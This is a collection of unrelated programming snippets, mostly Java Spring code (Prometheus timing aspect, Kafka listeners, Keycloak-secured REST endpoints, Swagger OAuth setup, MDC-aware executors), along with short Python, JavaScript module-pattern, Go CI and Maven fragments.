        MethodSignature signature = (MethodSignature)pjp.getSignature();
        PrometheusTimeMethod annot = (PrometheusTimeMethod)AnnotationUtils.findAnnotation(pjp.getTarget().getClass(), PrometheusTimeMethod.class);
        if (annot != null) {
            return annot;
        } else {
            String name = signature.getName();
            Class[] parameterTypes = signature.getParameterTypes();
            Method method = ReflectionUtils.findMethod(pjp.getTarget().getClass(), name, parameterTypes);
            return (PrometheusTimeMethod)AnnotationUtils.findAnnotation(method, PrometheusTimeMethod.class);
        }
    }

    private Summary ensureSummary(ProceedingJoinPoint pjp, String key) throws IllegalStateException {
        PrometheusTimeMethod annot;
        try {
            annot = this.getAnnotation(pjp);
        } catch (NoSuchMethodException var11) {
            throw new IllegalStateException("Annotation could not be found for pjp \"" + pjp.toShortString() + "\"", var11);
        } catch (NullPointerException var12) {
            throw new IllegalStateException("Annotation could not be found for pjp \"" + pjp.toShortString() + "\"", var12);
        }

        assert annot != null;

        Lock writeLock = this.summaryLock.writeLock();
        writeLock.lock();

        Summary var6;
        try {
            Summary summary = (Summary)this.summaries.get(key);
            if (summary != null) {
                var6 = summary;
                return var6;
            }

            summary = (Summary)((Builder)((Builder)Summary.build().name(annot.name())).help(annot.help())).register();
            this.summaries.put(key, summary);
            var6 = summary;
        } finally {
            writeLock.unlock();
        }

        return var6;
    }

    @Around("timeable()")
    public Object timeMethod(ProceedingJoinPoint pjp) throws Throwable {
        String key = pjp.getSignature().toLongString();
        Lock r = this.summaryLock.readLock();
        r.lock();

        Summary summary;
        try {
            summary = (Summary)this.summaries.get(key);
        } finally {
            r.unlock();
        }

        if (summary == null) {
            summary = this.ensureSummary(pjp, key);
        }

        Timer t = summary.startTimer();

        Object var6;
        try {
            var6 = pjp.proceed();
        } finally {
            t.observeDuration();
        }

        return var6;
    }
}
--------------------------------------------------------------------------------------------------------
@BeforeClass
public static void setUpBeforeClass() {
    System.setProperty("spring.kafka.bootstrap-servers", embeddedKafka.getBrokersAsString());
    System.setProperty("spring.cloud.stream.kafka.binder.zkNodes", embeddedKafka.getZookeeperConnectionString());
}
--------------------------------------------------------------------------------------------------------
//    @Autowired
//    private EmbeddedKafkaBroker embeddedKafka;
--------------------------------------------------------------------------------------------------------
public class Main {
  public static void main(String[] args) {
    OffsetDateTime o = OffsetDateTime.parse("2014-09-02T15:22:14.59-07:00");
    
    System.out.println(o);
  }
}
--------------------------------------------------------------------------------------------------------
//@ExtendWith(AnnotatedEmbedderRunner.class)
@UsingEmbedder(embedder = Embedder.class, verboseFailures = true, ignoreFailureInStories = false, generateViewAfterStories = true)
--------------------------------------------------------------------------------------------------------
@Api(tags = {"Swagger Resource"})
@SwaggerDefinition(tags = {
    @Tag(name = "Swagger Resource", description = "Write description here")
})
--------------------------------------------------------------------------------------------------------
import java.io.IOException;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.cloud.stream.annotation.EnableBinding;
import org.springframework.cloud.stream.annotation.StreamListener;
import org.springframework.cloud.stream.messaging.Sink;
import org.springframework.stereotype.Component;
import org.springframework.transaction.annotation.Transactional;

import com.fasterxml.jackson.core.JsonParseException;
import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.JsonMappingException;
import com.fasterxml.jackson.databind.ObjectMapper;

import io.flowing.retail.inventory.application.InventoryService;
import io.flowing.retail.inventory.domain.PickOrder;

@Component
@EnableBinding(Sink.class)
public class MessageListener {    
  
  @Autowired
  private MessageSender messageSender;
  
  @Autowired
  private InventoryService inventoryService;

  @StreamListener(target = Sink.INPUT, 
      condition="payload.messageType.toString()=='FetchGoodsCommand'")
  @Transactional
  public void retrievePaymentCommandReceived(String messageJson) throws JsonParseException, JsonMappingException, IOException {
    Message<FetchGoodsCommandPayload> message = new ObjectMapper().readValue(messageJson, new TypeReference<Message<FetchGoodsCommandPayload>>(){});
    
    FetchGoodsCommandPayload fetchGoodsCommand = message.getPayload();    
    String pickId = inventoryService.pickItems( // 
        fetchGoodsCommand.getItems(), fetchGoodsCommand.getReason(), fetchGoodsCommand.getRefId());
    
    messageSender.send( //
        new Message<GoodsFetchedEventPayload>( //
            "GoodsFetchedEvent", //
            message.getTraceId(), //
            new GoodsFetchedEventPayload() //
              .setRefId(fetchGoodsCommand.getRefId())
              .setPickId(pickId)));
  }
    
    
}
--------------------------------------------------------------------------------------------------------
        this.mockMvc = MockMvcBuilders
                .standaloneSetup(downloadController)
                .setCustomArgumentResolvers(this.getPrincipalArgumentResolver())
                .build();
--------------------------------------------------------------------------------------------------------
 @SpringBootTest(classes = {Application.class}, webEnvironment = WebEnvironment.RANDOM_PORT)
  public class MyTest {

    @LocalServerPort
    int randomServerPort;

    @LocalManagementPort
    int randomManagementPort;
--------------------------------------------------------------------------------------------------------
junit.jupiter.conditions.deactivate=*
junit.jupiter.extensions.autodetection.enabled=true
junit.jupiter.testinstance.lifecycle.default=per_class
junit.jupiter.execution.parallel.enabled=true
junit.jupiter.execution.parallel.config.strategy=fixed
junit.jupiter.execution.parallel.config.fixed.parallelism=2
junit.jupiter.execution.parallel.mode.default=same_thread
junit.jupiter.execution.parallel.mode.classes.default=concurrent
junit.jupiter.displayname.generator.default=org.junit.jupiter.api.DisplayNameGenerator$ReplaceUnderscores

--------------------------------------------------------------------------------------------------------
private SecurityScheme securityScheme() {
    GrantType grantType = new AuthorizationCodeGrantBuilder()
        .tokenEndpoint(new TokenEndpoint(AUTH_SERVER + "/token", "oauthtoken"))
        .tokenRequestEndpoint(
          new TokenRequestEndpoint(AUTH_SERVER + "/authorize", CLIENT_ID, CLIENT_SECRET))
        .build();
 
    SecurityScheme oauth = new OAuthBuilder().name("spring_oauth")
        .grantTypes(Arrays.asList(grantType))
        .scopes(Arrays.asList(scopes()))
        .build();
    return oauth;
}


private AuthorizationScope[] scopes() {
    AuthorizationScope[] scopes = { 
      new AuthorizationScope("read", "for read operations"), 
      new AuthorizationScope("write", "for write operations"), 
      new AuthorizationScope("foo", "Access foo API") };
    return scopes;
}
@Bean
public SecurityConfiguration security() {
    return SecurityConfigurationBuilder.builder()
        .clientId(CLIENT_ID)
        .clientSecret(CLIENT_SECRET)
        .scopeSeparator(" ")
        .useBasicAuthenticationWithAccessCodeGrant(true)
        .build();
}
--------------------------------------------------------------------------------------------------------
import java.util.Date;
import java.util.UUID;

public class Message<T> {

  private String messageType;
  private String id = UUID.randomUUID().toString(); // unique id of this message
  private String traceId = UUID.randomUUID().toString(); // trace id, default: new unique
  private String sender = "Checkout"; // for new messages
  private Date timestamp = new Date();

  private T payload;
  
  public Message() {    
  }
  
  public Message(String type, T payload) {
    this.messageType = type;
    this.payload = payload;
    this. traceId = UUID.randomUUID().toString();
  }

  public String getMessageType() {
    return messageType;
  }

  public void setMessageType(String messageType) {
    this.messageType = messageType;
  }

  public String getId() {
    return id;
  }

  public void setId(String id) {
    this.id = id;
  }

  public Date getTimestamp() {
    return timestamp;
  }

  public void setTimestamp(Date timestamp) {
    this.timestamp = timestamp;
  }

  public T getPayload() {
    return payload;
  }

  public void setPayload(T payload) {
    this.payload = payload;
  }

  @Override
  public String toString() {
    return "Message [messageType=" + messageType + ", id=" + id + ", timestamp=" + timestamp + ", payload=" + payload + "]";
  }

  public String getTraceId() {
    return traceId;
  }

  public void setTraceId(String traceId) {
    this.traceId = traceId;
  }

  public String getSender() {
    return sender;
  }

  public void setSender(String sender) {
    this.sender = sender;
  }
}
--------------------------------------------------------------------------------------------------------
import java.util.ArrayList;
import java.util.List;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;

import org.keycloak.KeycloakPrincipal;
import org.keycloak.adapters.RefreshableKeycloakSecurityContext;
import org.keycloak.representations.AccessToken;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import io.swagger.annotations.ApiOperation;

@RestController
@RequestMapping("/api")
public class OlaController {

    @Autowired
    private HolaService holaService;

    @CrossOrigin
    @RequestMapping(method = RequestMethod.GET, value = "/ola", produces = "text/plain")
    @ApiOperation("Returns the greeting in Portuguese")
    public String ola() {
        String hostname = System.getenv().getOrDefault("HOSTNAME", "Unknown");
        return String.format("Olá de %s", hostname);
    }

    @CrossOrigin
    @RequestMapping(method = RequestMethod.GET, value = "/ola-chaining", produces = "application/json")
    @ApiOperation("Returns the greeting plus the next service in the chain")
    public List<String> sayHelloChaining() {
        List<String> greetings = new ArrayList<>();
        greetings.add(ola());
        greetings.addAll(holaService.hola());
        return greetings;
    }

    @CrossOrigin
    @RequestMapping(method = RequestMethod.GET, value = "/ola-secured", produces = "text/plain")
    @ApiOperation("Returns a message that is only available for authenticated users")
    public String olaSecured(KeycloakPrincipal<RefreshableKeycloakSecurityContext> principal) {
        AccessToken token = principal.getKeycloakSecurityContext().getToken();
        return "This is a Secured resource. You are logged as " + token.getName();
    }

    @CrossOrigin
    @RequestMapping(method = RequestMethod.GET, value = "/logout", produces = "text/plain")
    @ApiOperation("Logout")
    public String logout() throws ServletException {
        HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest();
        request.logout();
        return "Logged out";
    }

    @RequestMapping(method = RequestMethod.GET, value = "/health")
    @ApiOperation("Used to verify the health of the service")
    public String health() {
        return "I'm ok";
    }
}
--------------------------------------------------------------------------------------------------------
    @CrossOrigin
    @RequestMapping(method = RequestMethod.GET, value = "/ola", produces = "text/plain")
    @ApiOperation("Returns the greeting in Portuguese")
    public String ola() {
        String hostname = System.getenv().getOrDefault("HOSTNAME", "Unknown");
        return String.format("Olá de %s", hostname);
    }
--------------------------------------------------------------------------------------------------------
    @CrossOrigin
    @RequestMapping(method = RequestMethod.GET, value = "/logout", produces = "text/plain")
    @ApiOperation("Logout")
    public String logout() throws ServletException {
        HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest();
        request.logout();
        return "Logged out";
    }
--------------------------------------------------------------------------------------------------------
    private void close() {
        TimerTask shutdownTask = new TimerTask() {
            @Override
            public void run() {
                ((AbstractApplicationContext) applicationContext).close();
            }
        };
        Timer shutdownTimer = new Timer();
        shutdownTimer.schedule(shutdownTask, TimeUnit.SECONDS.toMillis(3));
    }
--------------------------------------------------------------------------------------------------------
    Comparator<EmailSchedulingData> DEFAULT_COMPARATOR = (o1, o2) -> {
        final OffsetDateTime o1ScheduledDateTime = o1.getScheduledDateTime();
        final OffsetDateTime o2ScheduledDateTime = o2.getScheduledDateTime();
        if (o1ScheduledDateTime.isBefore(o2ScheduledDateTime)) {
            return -1;
        } else if (o1ScheduledDateTime.isAfter(o2ScheduledDateTime)) {
            return 1;
        } else {
            int priorityComparison = Integer.compare(o1.getAssignedPriority(), o2.getAssignedPriority());
            if (priorityComparison != 0) {
                return priorityComparison;
            } else {
                return o1.getId().compareTo(o2.getId());
            }
        }
    };
--------------------------------------------------------------------------------------------------------
public enum Week {

	MONDAY("星期一", "Monday", "Mon.", 1),
	TUESDAY("星期二", "Tuesday", "Tues.", 2),
	WEDNESDAY("星期三", "Wednesday", "Wed.", 3),
	THURSDAY("星期四", "Thursday", "Thur.", 4),
	FRIDAY("星期五", "Friday", "Fri.", 5),
	SATURDAY("星期六", "Saturday", "Sat.", 6),
	SUNDAY("星期日", "Sunday", "Sun.", 7);
	
	String name_cn;
	String name_en;
	String name_enShort;
	int number;
	
	Week(String name_cn, String name_en, String name_enShort, int number) {
		this.name_cn = name_cn;
		this.name_en = name_en;
		this.name_enShort = name_enShort;
		this.number = number;
	}
	
	public String getChineseName() {
		return name_cn;
	}

	public String getName() {
		return name_en;
	}

	public String getShortName() {
		return name_enShort;
	}

	public int getNumber() {
		return number;
	}
}
--------------------------------------------------------------------------------------------------------
    @XmlJavaTypeAdapter(WxXmlAdapters.CreateTimeAdaptor.class)
    @XmlElement(name = "CreateTime", required = true)
    @JsonIgnore
    protected Date createTime;
--------------------------------------------------------------------------------------------------------
import org.springframework.cache.annotation.CacheEvict;
import org.springframework.scheduling.annotation.EnableScheduling;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

/**
 * 定时清空cache
 * 
 * @author 肖文杰  https://github.com/xwjie
 */
@Component
@EnableScheduling
public class ClearCacheTask {

	/**
	 * 定时清空缓存
	 */
	@Scheduled(fixedRate = 60 * 60 * 1000L)
	@CacheEvict(value = { CacheNames.CONFIG }, allEntries = true)
	public void clearCaches() {
		System.out.println("\n------------ clear caches ------------\n");
	}

}
--------------------------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Configuration;
import org.springframework.data.orient.commons.repository.config.EnableOrientRepositories;
import org.springframework.data.orient.object.OrientObjectDatabaseFactory;
import org.springframework.data.orient.object.repository.support.OrientObjectRepositoryFactoryBean;
import org.springframework.transaction.annotation.Transactional;

import javax.annotation.PostConstruct;

@Configuration
@EnableOrientRepositories(basePackages = "com.github.pires.example.repository", repositoryFactoryBeanClass = OrientObjectRepositoryFactoryBean.class)
public class OrientDbConfiguration {

    @Autowired
    private OrientObjectDatabaseFactory factory;

    @PostConstruct
    @Transactional
    public void registerEntities() {
        factory.db().getEntityManager().registerEntityClasses("com.github.pires.example.model");
    }

}
--------------------------------------------------------------------------------------------------------

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.context.embedded.FilterRegistrationBean;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.Ordered;
import org.springframework.oxm.jaxb.Jaxb2Marshaller;
import org.springframework.web.filter.HiddenHttpMethodFilter;
import org.springframework.web.servlet.ViewResolver;
import org.springframework.web.servlet.config.annotation.ContentNegotiationConfigurer;
import org.springframework.web.servlet.config.annotation.ViewControllerRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;
import org.springframework.webflow.mvc.servlet.FlowHandlerAdapter;
import org.springframework.webflow.mvc.servlet.FlowHandlerMapping;
import org.thymeleaf.spring4.SpringTemplateEngine;
import org.thymeleaf.spring4.view.AjaxThymeleafViewResolver;
import org.thymeleaf.spring4.view.FlowAjaxThymeleafView;

import sample.ui.model.Vets;
import sample.ui.view.XmlViewResolver;

/**
 * Configures View-related items.
 *
 * @author Arnaldo Piccinelli
 */
@Configuration
public class WebMvcConfig extends WebMvcConfigurerAdapter {

	@Autowired
	private WebFlowConfig webFlowConfig;

	@Autowired
	private SpringTemplateEngine springTemplateEngine;

	@Override
	public void addViewControllers(ViewControllerRegistry registry) {
		registry.addViewController("/login").setViewName("login");
		registry.addViewController("/access").setViewName("access");
		registry.setOrder(Ordered.HIGHEST_PRECEDENCE);
	}

	@Override
	public void configureContentNegotiation(ContentNegotiationConfigurer configurer) {
		configurer.favorPathExtension(true).favorParameter(true);
	}

	@Bean(name = "marshallingXmlViewResolver")
	public ViewResolver getMarshallingXmlViewResolver() {
		Jaxb2Marshaller marshaller = new Jaxb2Marshaller();
		marshaller.setClassesToBeBound(new Class[] { Vets.class });
		return new XmlViewResolver(marshaller);
	}

	@Bean
	public FilterRegistrationBean hiddenFilterRegistrationBean() {
		return new FilterRegistrationBean(new HiddenHttpMethodFilter());
	}

	@Bean
	public FlowHandlerMapping flowHandlerMapping() {
		FlowHandlerMapping handlerMapping = new FlowHandlerMapping();
		handlerMapping.setOrder(-1);
		handlerMapping.setFlowRegistry(this.webFlowConfig.flowRegistry());
		return handlerMapping;
	}

	@Bean
	public FlowHandlerAdapter flowHandlerAdapter() {
		FlowHandlerAdapter handlerAdapter = new FlowHandlerAdapter();
		handlerAdapter.setFlowExecutor(this.webFlowConfig.flowExecutor());
		handlerAdapter.setSaveOutputToFlashScopeOnRedirect(true);
		return handlerAdapter;
	}

	@Bean
	public AjaxThymeleafViewResolver ajaxThymeleafViewResolver() {
		AjaxThymeleafViewResolver viewResolver = new AjaxThymeleafViewResolver();
		viewResolver.setViewClass(FlowAjaxThymeleafView.class);
		viewResolver.setTemplateEngine(springTemplateEngine);
		return viewResolver;
	}
}
--------------------------------------------------------------------------------------------------------
import java.util.Map;
import java.util.concurrent.ThreadPoolExecutor;

import org.slf4j.MDC;
import org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;

/**
 * A SLF4J MDC-compatible {@link ThreadPoolExecutor}.
 * <p>
 * In general, MDC is used to store diagnostic information (e.g. logfile name) in per-thread variables, to facilitate logging. However, although MDC
 * data is passed to thread children, this doesn't work when threads are reused in a thread pool. This is a drop-in replacement for
 * {@link ThreadPoolTaskExecutor} sets MDC data before each task appropriately.
 * </p>
 *
 * @author Dennis Schulte
 */
public class MdcThreadPoolTaskExecutor extends ThreadPoolTaskExecutor {

	private static final long serialVersionUID = 1L;
	private boolean useFixedContext = false;
	private Map<String, String> fixedContext;

	public MdcThreadPoolTaskExecutor() {
		super();
	}

	public MdcThreadPoolTaskExecutor(Map<String, String> fixedContext) {
		super();
		this.fixedContext = fixedContext;
		useFixedContext = (fixedContext != null);
	}

	private Map<String, String> getContextForTask() {
		return useFixedContext ? fixedContext : MDC.getCopyOfContextMap();
	}

	/**
	 * All executions will have MDC injected. {@code ThreadPoolExecutor}'s submission methods ({@code submit()} etc.)
	 * all delegate to this.
	 */
	@Override
	public void execute(Runnable command) {
		super.execute(wrap(command, getContextForTask()));
	}

	public static Runnable wrap(final Runnable runnable, final Map<String, String> context) {
		return new Runnable() {
			@Override
			public void run() {
				Map<String, String> previous = MDC.getCopyOfContextMap();
				if (context == null) {
					MDC.clear();
				} else {
					MDC.setContextMap(context);
				}
				try {
					runnable.run();
				} finally {
					if (previous == null) {
						MDC.clear();
					} else {
						MDC.setContextMap(previous);
					}
				}
			}
		};
	}
}
--------------------------------------------------------------------------------------------------------
import java.util.Map;
import java.util.concurrent.ArrayBlockingQueue;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.google.common.base.Function;
import com.predic8.membrane.core.Router;

public abstract class ScriptExecutorPool<T, R> implements Function<Map<String, Object>, R> {
	private static final Logger log = LoggerFactory.getLogger(ScriptExecutorPool.class);

	private static final int concurrency = Runtime.getRuntime().availableProcessors() * 2;
	ArrayBlockingQueue<T> scripts = new ArrayBlockingQueue<T>(concurrency);

	public void init(Router router) {
		scripts.add(createOneScript());
		router.getBackgroundInitializator().execute(new Runnable() {
			@Override
			public void run() {
				try {
					for (int i = 1; i < concurrency; i++)
						scripts.add(createOneScript());
				} catch (Exception e) {
					log.error("Error compiling script:", e);
				}
			}
		});
	}

	public final Object execute(Map<String, Object> parameters) {
		try {
			T script = scripts.take();
			try {
				return invoke(script, parameters);
			} finally {
				scripts.put(script);
			}
		} catch (InterruptedException e) {
			Thread.currentThread().interrupt();
			return null;
		}
	}

	protected abstract Object invoke(T script, Map<String, Object> parameters);
	protected abstract T createOneScript();

}
--------------------------------------------------------------------------------------------------------
import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.core.JsonParser;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.*;
import com.fasterxml.jackson.databind.annotation.JsonDeserialize;
import com.fasterxml.jackson.databind.annotation.JsonSerialize;
import com.predic8.membrane.core.Router;
import com.predic8.membrane.core.exchange.Exchange;
import com.predic8.membrane.core.interceptor.Interceptor;
import com.predic8.membrane.core.rules.Rule;
import com.predic8.membrane.core.rules.RuleKey;
import com.predic8.membrane.core.rules.StatisticCollector;
import com.predic8.membrane.core.stats.RuleStatisticCollector;
import com.predic8.membrane.core.transport.ssl.SSLContext;
import com.predic8.membrane.core.transport.ssl.SSLProvider;

import java.io.IOException;
import java.util.List;
import java.util.Map;

@JsonSerialize(using = FakeRule.Serializer.class)
@JsonDeserialize(using = FakeRule.Deserializer.class)
public class FakeRule implements Rule {
    private final String toStringText;
    final FakeKey key;

    public static class Serializer extends JsonSerializer<FakeRule>{
        @Override
        public void serialize(FakeRule fakeRule, JsonGenerator jsonGenerator, SerializerProvider serializerProvider) throws IOException {
            jsonGenerator.writeStartObject();
            jsonGenerator.writeStringField("name",fakeRule.toString());
            jsonGenerator.writeNumberField("port",fakeRule.getKey().getPort());
            jsonGenerator.writeEndObject();
        }
    }

    public static class Deserializer extends JsonDeserializer<FakeRule>{
        @Override
        public FakeRule deserialize(JsonParser jsonParser, DeserializationContext deserializationContext) throws IOException, JsonProcessingException {
            JsonNode node = jsonParser.getCodec().readTree(jsonParser);
            return new FakeRule(String.valueOf(node.get("name").asText()),node.get("port").asInt());
        }
    }

    public FakeRule(Rule rule) {
        this(rule.toString(),rule.getKey().getPort());
    }

    public FakeRule(String toStringText, int port) {
        this.toStringText = toStringText;
        this.key = new FakeKey(port);
    }

    @Override
    public String toString() {
        return toStringText;
    }

    @Override
    public List<Interceptor> getInterceptors() {
        return null;
    }

    @Override
    public void setInterceptors(List<Interceptor> interceptors) {

    }

    @Override
    public boolean isBlockRequest() {
        return false;
    }

    @Override
    public boolean isBlockResponse() {
        return false;
    }

    @Override
    public RuleKey getKey() {
        return key;
    }

    @Override
    public void setKey(RuleKey ruleKey) {

    }

    @Override
    public void setName(String name) {

    }

    @Override
    public String getName() {
        return null;
    }

    @Override
    public void setBlockRequest(boolean blockStatus) {

    }

    @Override
    public void setBlockResponse(boolean blockStatus) {

    }

    @Override
    public RuleStatisticCollector getStatisticCollector() {
        return null;
    }

    @Override
    public SSLContext getSslInboundContext() {
        return null;
    }

    @Override
    public SSLProvider getSslOutboundContext() {
        return null;
    }

    @Override
    public void init(Router router) throws Exception {

    }

    @Override
    public boolean isTargetAdjustHostHeader() {
        return false;
    }

    @Override
    public boolean isActive() {
        return false;
    }

    @Override
    public String getErrorState() {
        return null;
    }

    @Override
    public Rule clone() throws CloneNotSupportedException {
        return null;
    }
}
--------------------------------------------------------------------------------------------------------
class Fruit:
    def __init__(self, item):
        self.item = item


class Fruits:
    def __init__(self):
        self.items = {}

    def get_fruit(self, item):
        if item not in self.items:
            self.items[item] = Fruit(item)

        return self.items[item]


if __name__ == '__main__':
    fruits = Fruits()
    print(fruits.get_fruit('Apple'))
    print(fruits.get_fruit('Lime'))
--------------------------------------------------------------------------------------------------------
var testModule = (function () {
	
	var counter = 0;

	return {
		incrementCounter: function () {
			return counter++;
		},

		resetCounter: function () {
			console.log( "counter value prior to reset: " + counter);
			counter = 0;
		}
	};

})();

// Uso:

// Incrementando nosso contador
testModule.incrementCounter();

// Checando o valor do contador e resetando
// Saída: 1
testModule.resetCounter();


var myNamespace = (function () {
	
	var myPrivateVar, myPrivateMethod;

	// Uma variável privada contadora
	myPrivateVar = 0;

	// Uma função privada que registra qualquer argumento
	myPrivateMethod = function ( foo ) {
		console.log( foo );	
	};

	return {

		// Uma variável pública
		myPublicVar: "foo",

		// Uma função pública utilizando privadas
		myPublicFunction: function ( bar ) {

			// Incrementa nosso contador privado
			myPrivateVar++;

			// Chama nosso método privado usando bar
			myPrivateMethod( bar );
		}
	};
})();


var basketModule = (function () {
	
	// privates

	var basket = [];

	function doSomethingPrivate () {
		// ...
	}

	function doSomethingElsePrivate () {
		// ...
	}

	// Retornando um objeto exposto ao público
	return {

		// Adiciona items ao nosso carrinho
		addItem: function ( values ) {
			basket.push( values );
		},

		// Pega o número de itens na cesta
		getItemCount: function () {
			return basket.length;
		},

		// Apelido público para uma função privada
		doSomething: doSomethingPrivate,

		// Pega o valor total dos itens na cesta
		getTotal: function () {
			var q = this.getItemCount(),
				p = 0;

			while ( q-- ) {
				p += basket[q].price;
			}

			return p;
		}
	};
})();

var myModule = {
	
	myProperty: "someValue",

	// objetos literais podem conter propriedades e métodos
	// por exemplo: podemos definir um objeto adicional para o módulo de configuração:
	myConfig: {
		useCaching: true,
		language: "en"
	},

	// um método bem básico
	saySomething: function () {
		console.log( "Where in the world is Paul Irish today?" );
	},

	// retornando um valor baseado na configuração atual
	reportMyConfig: function () {
		console.log( "Caching is: " + ( this.myConfig.useCaching ? "enabled" : "disabled" ) );
	},

	// sobrescrevendo a configuração atual
	updateMyConfig: function ( newConfig ) {

		if ( typeof newConfig === "object" ) {
			this.myConfig = newConfig;
			console.log( this.myConfig.language );
		}
	}
};

// Saída: Where in the world is Paul Irish today?
myModule.saySomething();

// Saída: Caching is: enabled
myModule.reportMyConfig();

// Saída: fr
myModule.updateMyConfig({
	language: "fr",
	useCaching: false
});

// Saída: Caching is: disabled
myModule.reporMyConfig();



function Car ( model, year, miles ) {
	
	this.model = model;
	this.year = year;
	this.miles = miles;

}


// Note aqui que nós estamos usando 
// Object.prototype.method em vez de
// Object.prototype, de modo a evitar
// a redefinição do objeto prototype
Car.prototype.toString = function () {
	return this.model + " has done " + this.miles + " miles";
};

// Uso
var civic = new Car( "Honda Civic", 2009, 20000 );
var mondeo = new Car( "Ford Mondeo", 2010, 5000 );

console.log( civic.toString() );
console.log( mondeo.toString() );




// Cria um piloto de corrida de carro que herda do objeto person
var driver = Object.create( person );

// Configura algumas proprieadades para o piloto
defineProp( driver, "topSpeed", "100mph" );

// Pega uma propriedade heradada (1981)
console.log( driver.dateOfBirth );

// Pega a propriedade que nós configuramos (100mph)
console.log( driver.topSpeed );



// Abordagem compatível com ECMAScript 3

// 1. Sintaxe de Ponto

// Configura propriedades
newObject.someKey = "Hello World";

// Pega propriedade
var value = newObject.someKey;


// 2. Sintaxe de Colchete

// Configura propriedade
newObject["someKey"] = "Hello World";

// Pega propriedade
var value = newObject["someKey"];


// Abordagens compatíveis somente com ECMAScript 5
// Para mais informações veja: 
// http://kangax.github.com/es5-compat-table/

// 3. Object.defineProperty

// Configura propriedades
Object.defineProperty( newObject, "someKey", {
	value: "para mais controle do comportamento das propriedades",
	writable: true,
	enumerable: true,
	configurable: true
});

// Se o código acima parece um pouco difícil de ler, 
// uma versão mais curta pode ser escrita assim:

var defineProp = function ( obj, key, value ) {
	var config = {
		value: value,
		writable: true,
		enumerable: true,
		configurable: true
	};
	Object.defineProperty( obj, key, config );
};

// Para usar, nós então criamos um novo objeto vazio "person"
var person = Object.create( Object.prototype );

// Populando, preenchendo o objeto com propriedades
defineProp( person, "car", "Delorean" );
defineProp( person, "dateOfBirth", "1981" );
defineProp( person, "hasBeard", false );

console.log(person);
// Saída: Object {car: "Delorean", dateOfBirth: "1981", hasBeard: false}

// 4. Object.defineProperties

// Configura propriedades
Object.defineProperties( newObject, {
	"someKey": {
		value: "Hello World",
		writable: true
	},

	"anotherKey": {
		value: "Foo bar",
		writable: false
	}
});



// Cada uma das opções seguintes irão criar um novo objeto vazio:

var newObject = {};

// ou
var newObject = Object.create( Object.prototype );

// ou
var newObject = new Object();
--------------------------------------------------------------------------------------------------------
language: go
go:
  - 1.6.x
  - 1.7.x
  - 1.8.x
  - 1.9.x
  - master
script:
 - go test -v ./...
--------------------------------------------------------------------------------------------------------
/*
 * 创建闭包环境
 * 向闭包中传入模块管理对象F（~屏蔽压缩文件时，前面漏写；报错）
 */
~(function(F){
	//模块缓存器 存储已创建模块
	var moduleCache={}
})
((function(){
	//创建模块管理器对象F，并保存在全局作用域中
	return window.F={};
})());
/*
 * 创建或调用模块方法
 * @param 		url		参数为模块url
 * @param  		deps 		参数为依赖模块
 * @param		callback	参数为模块主函数
 */
F.module=function(url,modDeps,modCallback){
	//将参数转化为数组
	var args=[].slice.call(arguments),
	//获取模块构造函数（参数数组中最后一个参数成员）
	callback=args.pop(),
	//获取依赖模块(紧邻回调函数参数，且数据类型为数组)
	deps=(args.length&&args[args.length-1] instanceof Array)?args.pop():[],
	url=args.length?args.pop():null,
	params=[],
	depsCount=0,
	i=0,
	len;
	if(len==deps.length){
		while(i<len){
			//闭包保存i
			(function(i){
				depsCount++;
				//异步加载依赖模块
				loadModule(deps[i],function(mod){
					params[i]=mod;
					depsCount--;
					//如果依赖模块全部加载
					if (depsCount===0) {
						//在模块缓存器中矫正该模块，并执行构造函数
						setModule(url,params,callback);
					}
				});
			})(i);
			i++
		}
		//无依赖模块，直接执行回调函数
	}else{
		//在模块缓存器中矫正该模式，并执行构造函数
		setModule(url,[],callback);
	}
}

/*
 * 异步加载依赖模块所在文件
 * @param moduleName	模块路径（id）
 * @param callback		模块加载完成回调函数
 * 
 */
var moduleCache={},
setModule=function(moduleName,params,callback){},
loadModule=function(moduleName,callback){
	var _module;
	//如果该模块被加载过
	if(moduleCache[moduleName]){
		_module=moduleCache[moduleName];
		if (_module.status==='loaded') {
			setTimeout(callback(_module.exports),0);
		}else{
			//缓存该模块所处文件加载完成的回调函数
			_module.onload.push(callback);
		}
	}
	else{
		moduleCache[moduleName]={
			moduleName:moduleName,
			status:'loading',
			exports:null,
			onload:[callback]
		};
		loadSript(getUrl(moduleName));
	}
},
getUrl=function(){},
loadSript=function(){};

getUrl=function(moduleName){
	return string(moduleName).replace(/\.js$/g,''+'.js');
},
//加载脚本文件
loadScript=function(src){
	var _script=document.createElement('script');
	_script.type='text/javascript';
	_script.charset='UTF-8';
	_script.async=true;
	_script.src=src;
	document.getElementsByTagName('head')[0].appendChild(_script);
};
--------------------------------------------------------------------------------------------------------
	@Bean
	@Role(BeanDefinition.ROLE_INFRASTRUCTURE)
	@ConditionalOnMissingBean(Validator.class)
	public static LocalValidatorFactoryBean defaultValidator() {
		LocalValidatorFactoryBean factoryBean = new LocalValidatorFactoryBean();
		MessageInterpolatorFactory interpolatorFactory = new MessageInterpolatorFactory();
		factoryBean.setMessageInterpolator(interpolatorFactory.getObject());
		return factoryBean;
	}
--------------------------------------------------------------------------------------------------------
<project xmlns="http://maven.apache.org/POM/4.0.0"
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
